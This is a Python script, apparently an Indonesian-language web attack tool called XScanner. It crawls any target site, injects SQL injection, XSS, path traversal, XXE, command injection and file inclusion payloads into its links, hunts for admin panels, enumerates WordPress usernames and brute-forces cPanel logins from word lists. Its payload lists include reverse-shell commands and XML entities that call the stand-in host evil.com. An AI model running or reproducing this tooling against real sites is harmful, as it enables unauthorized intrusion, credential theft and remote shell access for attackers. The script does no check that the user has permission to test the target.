import requests
from urllib.parse import urljoin, urlparse
from bs4 import BeautifulSoup
import re
import time
import os
import sys
from termcolor import colored
import json
import colorama
import pyfiglet
from bs4 import BeautifulSoup
from rich.console import Console
from rich.text import Text
from rich.panel import Panel
from colorama import init, Fore
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from requests.auth import HTTPBasicAuth
import whois
import datetime
import logging
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
logging.getLogger('undetected_chromedriver').setLevel(logging.WARNING)

init(autoreset=True)
console = Console()

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 '
                  '(KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
    'Accept': '*/*',
    'Accept-Language': 'en-US,en;q=0.9,id;q=0.8',
    'Accept-Encoding': 'gzip, deflate, br',
    'Connection': 'keep-alive',
    'Cache-Control': 'no-cache',
    'Pragma': 'no-cache',
    'Referer': 'https://google.com',
    'DNT': '1',
    'Upgrade-Insecure-Requests': '1',
}

vuln_payloads = {
    "sql": [
        "1' OR '1'='1", "' OR 'a'='a", "' OR 1=1 --", "' OR 'x'='x'; --", "' OR ''='",
        "admin' --", "admin' #", "' OR sleep(5)--", "\" OR \"\" = \"", "1 AND 1=1",
        "1' AND SLEEP(5)#", "' OR 1=1#", "1' OR 1=1--", "' or 1=1--", "or 1=1",
        "1' or '1'='1' --", "1' OR 1=1 LIMIT 1 --", "1' or 1=1#", "1' or sleep(10)--",
        "' UNION SELECT NULL,NULL,NULL--", "' UNION SELECT username, password FROM users--",
        "'; exec xp_cmdshell('dir'); --", "' OR 1 GROUP BY CONCAT_WS(0x3a,user,version())--",
        "' OR updatexml(1,concat(0x7e,(version())),0)--"
    ],
    "xss": [
        "<script>alert(1)</script>", "\"><svg/onload=alert(1)>", "'><img src=x onerror=alert(1)>",
        "<body onload=alert(1)>", "<iframe src='javascript:alert(1)'>", "<img src=x onerror=prompt(1)>",
        "<svg><script>alert(1)</script>", "<video><source onerror='alert(1)'>", "<input autofocus onfocus=alert(1)>",
        "<details open ontoggle=alert(1)>", "<object data='javascript:alert(1)'>", "<a href='javascript:alert(1)'>X</a>",
        "<div onmouseover='alert(1)'>hover</div>", "';alert(1);//", "</script><script>alert(1)</script>"
    ],
    "directory_traversal": [
        "../../../../etc/passwd", "..\\..\\..\\..\\windows\\win.ini", "../" * 10 + "etc/passwd",
        "..%2f..%2f..%2fetc%2fpasswd", "..%c0%af..%c0%afetc/passwd", "../" * 8 + "boot.ini",
        "../../../../../boot.ini", "..%255c..%255c..%255cetc%255cpasswd", "..%u2216..%u2216etc%u2216passwd",
        "..%5c..%5c..%5cwindows%5csystem.ini", "../../../../../etc/shadow", "../../../../../../../../proc/self/environ"
    ],
    "xxe": [
        '''<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>''',
        '''<?xml version="1.0"?><!DOCTYPE data [<!ENTITY file SYSTEM "file:///etc/shadow">]><data>&file;</data>''',
        '''<!DOCTYPE data [<!ENTITY ent SYSTEM "file:///C:/Windows/win.ini">]><data>&ent;</data>''',
        '''<!DOCTYPE root [<!ENTITY xxe SYSTEM "http://evil.com/xxe">]><root>&xxe;</root>''',
        '''<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/hosts"> %xxe;]>'''
    ],
    "rce": [
        "127.0.0.1; ls", "127.0.0.1 && whoami", "`whoami`", "$(id)", "| id",
        "; cat /etc/passwd", "& ping -c 3 evil.com", "|| whoami", "&& curl evil.com",
        "; nc -e /bin/sh evil.com 4444", "`bash -i >& /dev/tcp/evil.com/4444 0>&1`", "$(ping -c1 attacker.com)",
        "| python -c 'import os; os.system(\"id\")'", "1|echo hacked"
    ],
    "lfi": [
        "../../etc/passwd", "../../../../../../../../etc/passwd", "../boot.ini", "../../etc/shadow",
        "../../../../../../../../proc/self/environ", "/etc/passwd%00", "/etc/passwd%2500", 
        "..%2f..%2fetc%2fpasswd", "../../../../../../../../../../../../../etc/passwd",
        "/var/log/auth.log", "/proc/version", "../../../../../../../../../windows/win.ini"
    ]
}


admin_paths = [
    'admin/', 'administrator/', 'admin1/', 'admin2/', 'adminarea/', 'adminpanel/',
    'wp-admin/', 'wp-login.php', 'user/', 'login/', 'backend/', 'dashboard/',
    'cms/', 'controlpanel/', 'cpanel/', 'manage/', 'adminconsole/', 'moderator/',
    'account/', 'systemadmin/', 'adm/', 'auth/', 'secure/', 'root/', 'panel/',
    'backend/login/', 'admin_login/', 'admin_area/', 'admin_section/', 'admin_login.php',
    'memberadmin/', 'auth/admin/', 'useradmin/', 'loginadmin/', 'secureadmin/',
    'wp-login/', 'wp-admin/admin.php', 'adminpage/', 'manage/admin/', 'admin123/',
    'admin.php', 'admin/index.php', 'panel/login.php', 'admin/login.php', 'dashboard/login'
]


wp_user_enum = [
    "/?author=1", "/?author=2", "/?author=3", "/?author=4", "/?author=5", "/?author=6", "/?author=7",
    "/wp-json/wp/v2/users", "/wp-json/wp/v2/users?per_page=100", "/?rest_route=/wp/v2/users",
    "/?rest_route=/wp/v2/users/&per_page=100", "/wp-login.php?action=lostpassword", "/xmlrpc.php",
    "/feed/", "/?feed=rss", "/?feed=atom", "/author/admin", "/author/root", "/?author=admin",
    "/?author=root", "/?author=test", "/author/test", "/author/guest", "/?author[]=1",
    "/?author[]=2", "/?author[]=3", "/?author_name=admin", "/?author_name=test",
    "/wp-admin/user-edit.php?user_id=1", "/?p=1", "/?m=1", "/index.php?author=1",
    "/?author=100", "/?author=9999", "/wp-json/wp/v2/users?page=2", "/wp-json/wp/v2/users?page=3",
    "/wp-json/wp/v2/users?page=10", "/?rest_route=/wp/v2/users&orderby=id", "/wp-json/wp/v2/users?_embed"
]


def log_write(log_file, msg, color=None):
    if color:
        print(colored(msg, color))
    else:
        print(msg)
    with open(log_file, "a", encoding="utf-8") as f:
        f.write(msg + "\n")

def get_domain_age(domain):
    try:
        w = whois.whois(domain)
        creation = w.creation_date
        if isinstance(creation, list):
            creation = creation[0]
        usia_tahun = (datetime.datetime.now() - creation).days // 365
        return f"{usia_tahun} tahun"
    except:
        return "Tidak diketahui"

def is_url_alive(url):
    try:
        r = requests.get(url, headers=headers, timeout=10)
        return r.status_code == 200
    except:
        return False

def extract_links(url, log_file, force_headless=False):
    links = set()
    try:
        res = requests.get(url, headers=headers, timeout=10, verify=False)
        if res.status_code != 200:
            log_write(log_file, f"[ERROR] Gagal membuka halaman: {url}", "red")
            return []

        soup = BeautifulSoup(res.text, 'html.parser')
        title = soup.title.string if soup.title else "Tidak ada title"
        log_write(log_file, f"[INFO] Title: {title}", "magenta")

        domain = urlparse(url).netloc
        age = get_domain_age(domain)
        alive = is_url_alive(url)
        status = "AKTIF" if alive else "MATI"
        log_write(log_file, f"[INFO] {status} | Usia: {age} | {url}", "green" if alive else "red")
        log_write(log_file, f"[INFO] Current URL: {url}", "cyan")

        a_tags = soup.find_all('a', href=True)
        log_write(log_file, f"[DEBUG] Ditemukan {len(a_tags)} tag <a>\n", "cyan")

        for a in a_tags:
            href = a['href']
            full_url = urljoin(url, href)
            if urlparse(full_url).scheme in ["http", "https"]:
                links.add(full_url)

    except Exception as e:
        log_write(log_file, f"[ERROR] Gagal extract link: {e}", "red")

    return list(links)

def find_admin_panel(base_url, log_file):
    def cpanel_cracker(base_url, user_list, pass_list, log_file):
        login_url = urljoin(base_url, "/cpanel")
        log_write(log_file, f"\n[*] Memulai brute-force CPanel pada: {login_url}", "blue")

        with open(user_list, 'r') as uf:
            usernames = [u.strip() for u in uf.readlines() if u.strip()]

        with open(pass_list, 'r') as pf:
            passwords = [p.strip() for p in pf.readlines() if p.strip()]

        for username in usernames:
            for password in passwords:
                try:
                    response = requests.get(login_url, auth=HTTPBasicAuth(username, password), timeout=7)
                    if response.status_code == 200:
                        log_write(log_file, f"[FOUND] Login CPanel berhasil: {username}:{password}", "green")
                        return
                    else:
                        log_write(log_file, f"[-] Gagal: {username}:{password}")
                except requests.RequestException as e:
                    log_write(log_file, f"[ERROR] Gagal request: {e}", "red")
        log_write(log_file, f"[!] Tidak ada kombinasi yang berhasil.", "red")
        
    log_write(log_file, f"[*] Searching for Admin Panel...", "blue")
    found = False
    for path in admin_paths:
        url = urljoin(base_url, path)
        try:
            res = requests.get(url, timeout=5)
            if res.status_code == 200:
                log_write(log_file, f"[+] Found Admin Panel at {url}", "green")
                found = True

                if "cpanel" in url.lower():
                    log_write(log_file, f"[*] Terdeteksi CPanel, menjalankan brute force...", "blue")

                    user_path = "users.txt"
                    pass_path = "password.txt"

                    if not os.path.exists(user_path):
                        log_write(log_file, f"[-] File '{user_path}' tidak ditemukan.", "red")
                        return
                    if not os.path.exists(pass_path):
                        log_write(log_file, f"[-] File '{pass_path}' tidak ditemukan.", "red")
                        return

                    cpanel_cracker(base_url, user_path, pass_path, log_file)
                if "wp-admin" in url.lower():
                    log_write(log_file, f"[*] Terdeteksi Wordpress, Enumerating WordPress usernames...", "blue")
                    found = False
                    for q in wp_user_enum:
                        url = urljoin(base_url, q)
                        try:
                            res = requests.get(url, timeout=5)
                            match = re.search(r"author/(.*?)/", res.url)
                            if match:
                                log_write(log_file, f"[+] Found WordPress username: {match.group(1)}", "green")
                                found = True
                        except:
                            continue
                    if not found:
                        log_write(log_file, f"[-] No WordPress usernames found.", "red")

        except requests.exceptions.RequestException:
            continue
    if not found:
        log_write(log_file, f"[-] No Admin Panel found.", "red")


def scan_sql_injection(url, log):
    found = False
    if '?' not in url:
        return
    base, query = url.split('?', 1)
    for payload in vuln_payloads["sql"]:
        test_url = f"{base}?{query}{payload}"
        try:
            res = requests.get(test_url, headers=headers, timeout=5)
            if any(err in res.text.lower() for err in ["sql syntax", "mysql"]):
                log_write(log, f"[+] SQLi found: {test_url}", "green")
                found = True
                break
        except:
            pass
    if not found:
        log_write(log, f"[-] No SQLi found: {url}", "red")

def scan_xss(url, log):
    found = False
    for payload in vuln_payloads["xss"]:
        test_url = url + payload
        try:
            res = requests.get(test_url, headers=headers, timeout=5)
            if payload in res.text:
                log_write(log, f"[+] XSS found: {test_url}", "green")
                found = True
                break
        except:
            pass
    if not found:
        log_write(log, f"[-] No XSS found: {url}", "red")

def scan_directory_traversal(url, log):
    for payload in vuln_payloads["directory_traversal"]:
        test_url = f"{url}?file={payload}"
        try:
            res = requests.get(test_url, headers=headers, timeout=5)
            if "root:" in res.text:
                log_write(log, f"[+] Directory Traversal found: {test_url}", "green")
                return
        except:
            pass
    log_write(log, f"[-] No Directory Traversal found: {url}", "red")

def scan_xxe(url, log):
    headers_xml = headers.copy()
    headers_xml['Content-Type'] = 'application/xml'
    payload = vuln_payloads["xxe"][0]
    try:
        res = requests.post(url, data=payload, headers=headers_xml, timeout=5)
        if "root:" in res.text:
            log_write(log, f"[+] XXE found: {url}", "green")
            return
    except:
        pass
    log_write(log, f"[-] No XXE found: {url}", "red")

def scan_clickjacking(url, log):
    try:
        res = requests.get(url, headers=headers, timeout=5)
        if "x-frame-options" not in res.headers:
            log_write(log, f"[+] Clickjacking found: {url}", "green")
        else:
            log_write(log, f"[-] No Clickjacking found: {url}", "red")
    except:
        log_write(log, f"[-] No Clickjacking found: {url}", "red")

def scan_rce(url, params, log):
    for param in params:
        for payload in vuln_payloads["rce"]:
            test_url = f"{url}?{param}={payload}"
            try:
                res = requests.get(test_url, timeout=5)
                if any(k in res.text for k in ["uid=", "gid="]):
                    log_write(log, f"[+] RCE found: {test_url}", "green")
                    return
            except:
                pass
    log_write(log, f"[-] No RCE found: {url}", "red")

def scan_lfi(url, param, log):
    for payload in vuln_payloads["lfi"]:
        test_url = f"{url}?{param}={payload}"
        try:
            res = requests.get(test_url, timeout=5)
            if "root:" in res.text:
                log_write(log, f"[+] LFI found: {test_url}", "green")
                return
        except:
            pass
    log_write(log, f"[-] No LFI found: {url}", "red")

def sanitize_filename(url):
    return re.sub(r'[^\w\-_.]', '_', urlparse(url).netloc)


def main():
    os.system('cls' if os.name == 'nt' else 'clear')
    banner = pyfiglet.figlet_format(" XScanner ", font="slant")
    console.print(Panel(Text(banner, style="bold red"), subtitle="[bold cyan]V1.0[/bold cyan]", expand=False))
    print()
    target = input("Masukkan URL target: ").strip()
    if not target.startswith("http"):
        print(colored("URL tidak valid.", "red"))
        return
    print()
    print("──────────────────────────────────────────────────────────")
    print()
    print(colored("\n[*] Mengambil dan menscan semua link internal...", "blue"))
    print()

    log_file = os.path.join("result", f"{sanitize_filename(target)}.txt")
    with open(log_file, "w") as f:
        f.write(f"== XScanner Report for {target} ==\n\n")

    links = extract_links(target, log_file, force_headless='--headless' in sys.argv)
    if not links:
        log_write(log_file, "[-] Tidak ada link ditemukan.", "red")
        return
    find_admin_panel(target, log_file)

    for link in links:
        log_write(log_file, f"\n[SCAN] {link}", "blue")
        scan_sql_injection(link, log_file)
        scan_xss(link, log_file)
        scan_directory_traversal(link, log_file)
        scan_xxe(link, log_file)
        scan_clickjacking(link, log_file)

        parsed = urlparse(link)
        query_params = parsed.query.split('&')
        param_names = [p.split('=')[0] for p in query_params if '=' in p]
        scan_rce(link, param_names, log_file)
        for param in param_names:
            scan_lfi(link, param, log_file)

    print()
    print("──────────────────────────────────────────────────────────")
    print()
    print(colored(f"Scan selesai! Lihat hasilnya di result/{sanitize_filename(target)}.txt", "green"))

if __name__ == "__main__":
    main()
